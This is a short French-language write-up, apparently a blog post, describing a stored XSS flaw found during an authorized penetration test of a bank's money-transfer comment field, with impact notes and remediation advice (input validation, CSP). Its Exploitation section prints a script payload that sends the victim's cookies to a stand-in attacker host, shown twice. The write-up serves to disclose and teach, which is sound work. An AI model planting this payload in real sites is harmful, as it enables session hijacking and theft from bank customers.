---
title: "Exploitation d'une vulnérabilité XSS dans une application bancaire"
author: "fatoumata"
date: "2024-04-15"
tags: ["Web Security", "XSS", "Banking"]
slug: "xss-vulnerability-banking-app"
thumbnail: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5"
---

# Exploitation d'une vulnérabilité XSS dans une application bancaire

## Introduction

Dans ce writeup, nous allons vous présenter comment notre équipe a découvert et exploité une vulnérabilité XSS persistante dans l'application web d'une importante banque en Afrique de l'Ouest.

## Découverte initiale

Lors d'un test de pénétration autorisé, nous avons remarqué que le champ de commentaire dans la section de transfert d'argent n'était pas correctement assaini...

## Exploitation

Nous avons utilisé la payload suivante pour démontrer la vulnérabilité:

```javascript
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>


<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

## Impact

Cette vulnérabilité aurait pu permettre à un attaquant de:
1. Voler des sessions d'utilisateurs
2. Modifier des transactions
3. Accéder à des informations personnelles

## Correction

Nous avons recommandé l'implémentation d'une validation stricte des entrées et l'utilisation de Content Security Policy (CSP) pour atténuer ce type de vulnérabilités.